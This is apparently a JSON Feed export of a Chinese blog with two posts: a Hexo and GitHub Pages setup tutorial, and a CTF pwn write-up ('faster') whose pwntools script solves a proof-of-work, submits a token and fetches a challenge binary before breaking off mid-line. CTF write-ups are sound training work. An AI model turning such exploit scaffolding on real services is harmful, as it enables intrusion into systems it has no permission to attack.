{
    "version": "https://jsonfeed.org/version/1",
    "title": "小姜天堂",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/06/23/%E6%8E%A8%E8%8D%90/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/",
            "url": "http://example.com/2021/06/23/%E6%8E%A8%E8%8D%90/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/",
            "title": "博客搭建教程",
            "date_published": "2021-06-23T08:26:21.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>体验更加排版请访问原文链接：<span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubGl1eGlhbmFuLmNvbS9idWlsZC1ibG9nLXdlYnNpdGUtYnktaGV4by1naXRodWIuaHRtbA==\">http://blog.liuxianan.com/build-blog-website-by-hexo-github.html</span></p>\n<p>使用 github pages 服务搭建博客的好处有：</p>\n<ol>\n<li>全是静态文件，访问速度快；</li>\n<li>免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</li>\n<li>可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于 github 的；</li>\n<li>数据绝对安全，基于 github 的版本管理，想恢复到哪个历史版本都行；</li>\n<li>博客内容可以轻松打包、转移、发布到其它平台；</li>\n<li>等等</li>\n</ol>\n<h2 id=\"11-准备工作\"><a class=\"anchor\" href=\"#11-准备工作\">#</a> 1.1. 准备工作</h2>\n<p>在开始一切之前，你必须已经：</p>\n<ol>\n<li>有一个 github 账号，没有的话去注册一个；</li>\n<li>安装了 node.js、npm，并了解相关基础知识；</li>\n<li>安装了 git for windows（或者其它 git 客户端）</li>\n</ol>\n<p>本文所使用的环境：</p>\n<ol>\n<li>Windows8.1</li>\n<li>node.js@5.5.0</li>\n<li>git@1.9.2</li>\n<li>hexo@3.2.2</li>\n</ol>\n<h1 id=\"搭建github博客\"><a class=\"anchor\" href=\"#搭建github博客\">#</a> 搭建 github 博客</h1>\n<h2 id=\"21-创建仓库\"><a class=\"anchor\" href=\"#21-创建仓库\">#</a> 2.1. 创建仓库</h2>\n<p>新建一个名为 <code>你的用户名.github.io</code>  的仓库，比如说，如果你的 github 用户名是 test，那么你就新建 <code>test.github.io</code>  的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 <span class=\"exturl\" data-url=\"aHR0cDovL3Rlc3QuZ2l0aHViLmlvLw==\">http://test.github.io</span> 了，是不是很方便？</p>\n<p>由此可见，每一个 github 账户最多只能创建一个这样可以直接使用域名访问的仓库。</p>\n<p>几个注意的地方：</p>\n<ol>\n<li>注册的邮箱一定要验证，否则不会成功；</li>\n<li>仓库名字必须是： <code>username.github.io</code> ，其中 <code>username</code>  是你的用户名；</li>\n<li>仓库创建成功不会立即生效，需要过一段时间，大概 10-30 分钟，或者更久，我的等了半个小时才生效；</li>\n</ol>\n<p>创建成功后，默认会在你这个仓库里生成一些示例页面，以后你的网站所有代码都是放在这个仓库里啦。</p>\n<h2 id=\"22-绑定域名\"><a class=\"anchor\" href=\"#22-绑定域名\">#</a> 2.2. 绑定域名</h2>\n<p>当然，你不绑定域名肯定也是可以的，就用默认的  <code>xxx.github.io</code>  来访问，如果你想更个性一点，想拥有一个属于自己的域名，那也是 OK 的。</p>\n<p>首先你要注册一个域名，域名注册以前总是推荐去 <code>godaddy</code> ，现在觉得其实国内的阿里云也挺不错的，价格也不贵，毕竟是大公司，放心！</p>\n<p>绑定域名分 2 种情况：带 www 和不带 www 的。</p>\n<p>域名配置最常见有 2 种方式，CNAME 和 A 记录，CNAME 填写域名，A 记录填写 IP，由于不带 www 方式只能采用 A 记录，所以必须先 ping 一下 <code>你的用户名.github.io</code>  的 IP，然后到你的域名 DNS 设置页，将 A 记录指向你 ping 出来的 IP，将 CNAME 指向 <code>你的用户名.github.io</code> ，这样可以保证无论是否添加 www 都可以访问，如下：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160823_191336_238_8683.png\" alt=\"img\" /></p>\n<p>然后到你的 github 项目根目录新建一个名为 CNAME 的文件（无后缀），里面填写你的域名，加不加 www 看你自己喜好，因为经测试：</p>\n<ul>\n<li>如果你填写的是没有 www 的，比如 <span class=\"exturl\" data-url=\"aHR0cDovL215Z2l0Lm1l\">mygit.me</span>，那么无论是访问 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5teWdpdC5tZS8=\">http://www.mygit.me</span> 还是 <span class=\"exturl\" data-url=\"aHR0cDovL215Z2l0Lm1lLw==\">http://mygit.me</span> ，都会自动跳转到 <span class=\"exturl\" data-url=\"aHR0cDovL215Z2l0Lm1lLw==\">http://mygit.me</span></li>\n<li>如果你填写的是带 www 的，比如 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5teWdpdC5tZQ==\">www.mygit.me</span> ，那么无论是访问 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5teWdpdC5tZS8=\">http://www.mygit.me</span> 还是 <span class=\"exturl\" data-url=\"aHR0cDovL215Z2l0Lm1lLw==\">http://mygit.me</span> ，都会自动跳转到 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5teWdpdC5tZS8=\">http://www.mygit.me</span></li>\n<li>如果你填写的是其它子域名，比如 <span class=\"exturl\" data-url=\"aHR0cDovL2FiYy5teWdpdC5tZQ==\">abc.mygit.me</span>，那么访问 <span class=\"exturl\" data-url=\"aHR0cDovL2FiYy5teWdpdC5tZS8=\">http://abc.mygit.me</span> 没问题，但是访问 <span class=\"exturl\" data-url=\"aHR0cDovL215Z2l0Lm1lLw==\">http://mygit.me</span> ，不会自动跳转到 <span class=\"exturl\" data-url=\"aHR0cDovL2FiYy5teWdpdC5tZS8=\">http://abc.mygit.me</span></li>\n</ul>\n<p>另外说一句，在你绑定了新域名之后，原来的 <code>你的用户名.github.io</code>  并没有失效，而是会自动跳转到你的新域名。</p>\n<h1 id=\"配置ssh-key\"><a class=\"anchor\" href=\"#配置ssh-key\">#</a> 配置 SSH key</h1>\n<p>为什么要配置这个呢？因为你提交代码肯定要拥有你的 github 权限才可以，但是直接使用用户名和密码太不安全了，所以我们使用 ssh key 来解决本地和服务器的连接问题。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token builtin class-name\">cd</span> ~/. <span class=\"token function\">ssh</span> <span class=\"token comment\">#检查本机已存在的 ssh 密钥</span></pre></td></tr></table></figure><p>如果提示：No such file or directory 说明你是第一次使用 git。</p>\n<pre><code>ssh-keygen -t rsa -C &quot;邮件地址&quot;\n</code></pre>\n<p>然后连续 3 次回车，最终会生成一个文件在用户目录下，打开用户目录，找到 <code>.ssh\\id_rsa.pub</code>  文件，记事本打开并复制里面的内容，打开你的 github 主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160818_143914_495_9084.png\" alt=\"img\" /></p>\n<p>将刚复制的内容粘贴到 key 那里，title 随便填，保存。</p>\n<h2 id=\"31-测试是否成功\"><a class=\"anchor\" href=\"#31-测试是否成功\">#</a> 3.1. 测试是否成功</h2>\n<pre><code>$ ssh -T git@github.com # 注意邮箱地址不用改\n</code></pre>\n<p>如果提示 <code>Are you sure you want to continue connecting (yes/no)?</code> ，输入 yes，然后会看到：</p>\n<blockquote>\n<p>Hi liuxianan! You've successfully authenticated, but GitHub does not provide shell access.</p>\n</blockquote>\n<p>看到这个信息说明 SSH 已配置成功！</p>\n<p>此时你还需要配置：</p>\n<pre><code>$ git config --global user.name &quot;liuxianan&quot;// 你的github用户名，非昵称\n$ git config --global user.email  &quot;xxx@qq.com&quot;// 填写你的github注册邮箱\n</code></pre>\n<p>具体这个配置是干嘛的我没仔细深究。</p>\n<h1 id=\"使用hexo写博客\"><a class=\"anchor\" href=\"#使用hexo写博客\">#</a> 使用 hexo 写博客</h1>\n<h2 id=\"41-hexo简介\"><a class=\"anchor\" href=\"#41-hexo简介\">#</a> 4.1. hexo 简介</h2>\n<p>Hexo 是一个简单、快速、强大的基于 Github Pages 的博客发布工具，支持 Markdown 格式，有众多优秀插件和主题。</p>\n<p>官网： <span class=\"exturl\" data-url=\"aHR0cDovL2hleG8uaW8v\">http://hexo.io</span><br />\ngithub: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhv\">https://github.com/hexojs/hexo</span></p>\n<h2 id=\"42-原理\"><a class=\"anchor\" href=\"#42-原理\">#</a> 4.2. 原理</h2>\n<p>由于 github pages 存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以 hexo 所做的就是将这些 md 文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到 github。</p>\n<h2 id=\"43-注意事项\"><a class=\"anchor\" href=\"#43-注意事项\">#</a> 4.3. 注意事项</h2>\n<p>安装之前先来说几个注意事项：</p>\n<ol>\n<li>很多命令既可以用 Windows 的 cmd 来完成，也可以使用 git bash 来完成，但是部分命令会有一些问题，为避免不必要的问题，建议全部使用 git bash 来执行；</li>\n<li>hexo 不同版本差别比较大，网上很多文章的配置信息都是基于 2.x 的，所以注意不要被误导；</li>\n<li>hexo 有 2 种 <code>_config.yml</code>  文件，一个是根目录下的全局的 <code>_config.yml</code> ，一个是各个 <code>theme</code>  下的；</li>\n</ol>\n<h2 id=\"44-安装\"><a class=\"anchor\" href=\"#44-安装\">#</a> 4.4. 安装</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">npm</span> <span class=\"token function\">install</span> -g hexo</pre></td></tr></table></figure><h2 id=\"45-初始化\"><a class=\"anchor\" href=\"#45-初始化\">#</a> 4.5. 初始化</h2>\n<p>在电脑的某个地方新建一个名为 hexo 的文件夹（名字可以随便取），比如我的是 <code>F:\\Workspaces\\hexo</code> ，由于这个文件夹将来就作为你存放代码的地方，所以最好不要随便放。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token builtin class-name\">cd</span> /f/Workspaces/hexo/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ hexo init</pre></td></tr></table></figure><p>hexo 会自动下载一些文件到这个目录，包括 node_modules，目录结构如下图：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160818_115922_773_1148.png\" alt=\"img\" /></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo g <span class=\"token comment\"># 生成</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ hexo s <span class=\"token comment\"># 启动服务</span></pre></td></tr></table></figure><p>执行以上命令之后，hexo 就会在 public 文件夹生成相关 html 文件，这些文件将来都是要提交到 github 去的：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160818_120700_028_2426.png\" alt=\"img\" /></p>\n<p><code>hexo s</code>  是开启本地预览服务，打开浏览器访问 <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo0MDAwLw==\">http://localhost:4000</span> 即可看到内容，很多人会碰到浏览器一直在转圈但是就是加载不出来的问题，一般情况下是因为端口占用的缘故，因为 4000 这个端口太常见了，解决端口冲突问题请参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubGl1eGlhbmFuLmNvbS93aW5kb3dzLXBvcnQtYmluZC5odG1s\">http://blog.liuxianan.com/windows-port-bind.html</span></p>\n<p>第一次初始化的时候 hexo 已经帮我们写了一篇名为 Hello World 的文章，默认的主题比较丑，打开时就是这个样子：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160818_132443_202_6848.png\" alt=\"img\" /></p>\n<h2 id=\"46-修改主题\"><a class=\"anchor\" href=\"#46-修改主题\">#</a> 4.6. 修改主题</h2>\n<p>既然默认主题很丑，那我们别的不做，首先来替换一个好看点的主题。这是 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL3RoZW1lcy8=\">官方主题</span>。</p>\n<p>个人比较喜欢的 2 个主题：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Bpbmdnb2QvaGV4by10aGVtZS1qZWt5bGw=\">hexo-theme-jekyll</span> 和 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpdHRlbi9oZXhvLXRoZW1lLXlpbGlh\">hexo-theme-yilia</span>。</p>\n<p>首先下载这个主题：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token builtin class-name\">cd</span> /f/Workspaces/hexo/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ <span class=\"token function\">git</span> clone https://github.com/litten/hexo-theme-yilia.git themes/yilia</pre></td></tr></table></figure><p>下载后的主题都在这里：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160818_134500_245_0912.png\" alt=\"img\" /></p>\n<p>修改 <code>_config.yml</code>  中的 <code>theme: landscape</code>  改为 <code>theme: yilia</code> ，然后重新执行 <code>hexo g</code>  来重新生成。</p>\n<p>如果出现一些莫名其妙的问题，可以先执行 <code>hexo clean</code>  来清理一下 public 的内容，然后再来重新生成和发布。</p>\n<h2 id=\"47-上传之前\"><a class=\"anchor\" href=\"#47-上传之前\">#</a> 4.7. 上传之前</h2>\n<p>在上传代码到 github 之前，一定要记得先把你以前所有代码下载下来（虽然 github 有版本管理，但备份一下总是好的），因为从 hexo 提交代码时会把你以前的所有代码都删掉。</p>\n<h2 id=\"48-上传到github\"><a class=\"anchor\" href=\"#48-上传到github\">#</a> 4.8. 上传到 github</h2>\n<p>如果你一切都配置好了，发布上传很容易，一句 <code>hexo d</code>  就搞定，当然关键还是你要把所有东西配置好。</p>\n<p>首先， <code>ssh key</code>  肯定要配置好。</p>\n<p>其次，配置 <code>_config.yml</code>  中有关 deploy 的部分：</p>\n<p>正确写法：</p>\n<pre><code>deploy:  type: git  repository: git@github.com:liuxianan/liuxianan.github.io.git  branch: master\n</code></pre>\n<p>错误写法：</p>\n<pre><code>deploy:  type: github  repository: https://github.com/liuxianan/liuxianan.github.io.git  branch: master\n</code></pre>\n<p>后面一种写法是 hexo2.x 的写法，现在已经不行了，无论是哪种写法，此时直接执行 <code>hexo d</code>  的话一般会报如下错误：</p>\n<pre><code>Deployer not found: github 或者 Deployer not found: git\n</code></pre>\n<p>原因是还需要安装一个插件：</p>\n<pre><code>npm install hexo-deployer-git --save\n</code></pre>\n<p>其它命令不确定，部署这个命令一定要用 git bash，否则会提示 <code>Permission denied (publickey).</code></p>\n<p>打开你的 git bash，输入 <code>hexo d</code>  就会将本次有改动的代码全部提交，没有改动的不会：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160818_140441_769_5024.png\" alt=\"img\" /></p>\n<h2 id=\"49-保留cname-readmemd等文件\"><a class=\"anchor\" href=\"#49-保留cname-readmemd等文件\">#</a> 4.9. 保留 CNAME、README.md 等文件</h2>\n<p>提交之后网页上一看，发现以前其它代码都没了，此时不要慌，一些非 md 文件可以把他们放到 source 文件夹下，这里的所有文件都会原样复制（除了 md 文件）到 public 目录的：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160818_141037_580_8035.png\" alt=\"img\" /></p>\n<p>由于 hexo 默认会把所有 md 文件都转换成 html，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1SRUFETUUtOXk0anM0NmgubWQ=\">包括 README.md</span>，所有需要每次生成之后、上传之前，手动将 README.md 复制到 public 目录，并删除 README.html。</p>\n<h2 id=\"410-常用hexo命令\"><a class=\"anchor\" href=\"#410-常用hexo命令\">#</a> 4.10. 常用 hexo 命令</h2>\n<p>常见命令</p>\n<pre><code>hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）hexo deploy #部署到GitHubhexo help  # 查看帮助hexo version  #查看Hexo的版本\n</code></pre>\n<p>缩写：</p>\n<pre><code>hexo n == hexo newhexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy\n</code></pre>\n<p>组合命令：</p>\n<pre><code>hexo s -g #生成并本地预览hexo d -g #生成并上传\n</code></pre>\n<h2 id=\"411-_configyml\"><a class=\"anchor\" href=\"#411-_configyml\">#</a> 4.11. _config.yml</h2>\n<p>这里面都是一些全局配置，每个参数的意思都比较简单明了，所以就不作详细介绍了。</p>\n<p>需要特别注意的地方是，冒号后面必须有一个空格，否则可能会出问题。</p>\n<h2 id=\"412-写博客\"><a class=\"anchor\" href=\"#412-写博客\">#</a> 4.12. 写博客</h2>\n<p>定位到我们的 hexo 根目录，执行命令：</p>\n<pre><code>hexo new 'my-first-blog'\n</code></pre>\n<p>hexo 会帮我们在 <code>_posts</code>  下生成相关 md 文件：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160823_183047_352_1475.png\" alt=\"img\" /></p>\n<p>我们只需要打开这个文件就可以开始写博客了，默认生成如下内容：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160823_183325_470_9306.png\" alt=\"img\" /></p>\n<p>当然你也可以直接自己新建 md 文件，用这个命令的好处是帮我们自动生成了时间。</p>\n<p>一般完整格式如下：</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>---title: postName #文章页面上的显示名称，一般是中文date: 2013-12-02 15:30:16 #文章生成时间，一般不改，当然也可以任意修改categories: 默认分类 #分类tags: [tag1,tag2,tag3] #文章标签，可空，多标签请用格式，注意:后面有个空格description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面---以下是正文</pre></td></tr></table></figure><p>那么 <code>hexo new page 'postName'</code>  命令和 <code>hexo new 'postName'</code>  有什么区别呢？</p>\n<pre><code>hexo new page &quot;my-second-blog&quot;\n</code></pre>\n<p>生成如下：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160823_184852_854_6502.png\" alt=\"img\" /></p>\n<p>最终部署时生成： <code>hexo\\public\\my-second-blog\\index.html</code> ，但是它不会作为文章出现在博文目录。</p>\n<h3 id=\"4121-写博客工具\"><a class=\"anchor\" href=\"#4121-写博客工具\">#</a> 4.12.1. 写博客工具</h3>\n<p>那么用什么工具写博客呢？这个我还没去找，以前自己使用 editor.md 简单弄了个，大家有好用的 hexo 写博客工具可以推荐个。</p>\n<h3 id=\"4122-如何让博文列表不显示全部内容\"><a class=\"anchor\" href=\"#4122-如何让博文列表不显示全部内容\">#</a> 4.12.2. 如何让博文列表不显示全部内容</h3>\n<p>默认情况下，生成的博文目录会显示全部的文章内容，如何设置文章摘要的长度呢？</p>\n<p>答案是在合适的位置加上 `` 即可，例如：</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token title important\"><span class=\"token punctuation\">#</span> 前言使用github pages服务搭建博客的好处有：1. 全是静态文件，访问速度快；2. 免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；3. 可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</span><span class=\"token comment\">&lt;!--more--></span><span class=\"token list punctuation\">4.</span> 数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；5. 博客内容可以轻松打包、转移、发布到其它平台；6. 等等；</pre></td></tr></table></figure><p>最终效果：</p>\n<p><img data-src=\"http://image.liuxianan.com/201608/20160823_184633_653_1893.png\" alt=\"img\" /></p>\n<h1 id=\"最终效果\"><a class=\"anchor\" href=\"#最终效果\">#</a> 最终效果</h1>\n<p>可以访问我的 git 博客来查看效果： [<span class=\"exturl\" data-url=\"aHR0cDovL2dpbmdlcm1vdS50b3A=\">http://gingermou.top</span>]</p>\n<p>不过呢，其实这个博客我只是拿来玩一玩的，没打算真的把它当博客，因为我已经有一个自己的博客了，哈哈！正因如此，本文仅限入门学习，关于 hexo 搭建个人博客的更高级玩法大家可以另找教程。</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2020/09/09/Pwn/faster/",
            "url": "http://example.com/2020/09/09/Pwn/faster/",
            "title": "faster",
            "date_published": "2020-09-09T12:12:03.000Z",
            "content_html": "<h3 id=\"faster\"><a class=\"anchor\" href=\"#faster\">#</a> faster</h3>\n<ul>\n<li>求解 pow</li>\n<li>capstone 反汇编，依次求解每一层正确的输入值</li>\n<li>栈溢出，构造 ROPchain</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> hashlib<span class=\"token punctuation\">,</span> itertools<span class=\"token punctuation\">,</span> string<span class=\"token punctuation\">,</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> capstone <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>token <span class=\"token operator\">=</span> <span class=\"token string\">\"icq947dbf7d511024e3e7be0d0aebd59\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>HOST<span class=\"token punctuation\">,</span> PORT <span class=\"token operator\">=</span> <span class=\"token string\">\"39.96.72.181\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42732</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>HOST<span class=\"token punctuation\">,</span> PORT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">solver</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    alpha_set <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    algorithm <span class=\"token operator\">=</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>hashlib<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>permutations<span class=\"token punctuation\">(</span>alpha_set<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        s <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> algorithm<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> val <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">return</span> s</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GG not found...\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">11</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"x[:20] = \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>val <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;built-in function openssl_\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>name <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125; &amp; &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>res <span class=\"token operator\">=</span> solver<span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input your token: \"</span><span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Creating pwn file, please wait ...\\n\\n\\n\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>data <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>bindump <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv.tar.gz\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>bindump<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"tar -zxf recv.tar.gz -C ./chal\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"upx -d chal/pwn*\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"mv chal/pwn* ./pwn2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your docker run port [\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token 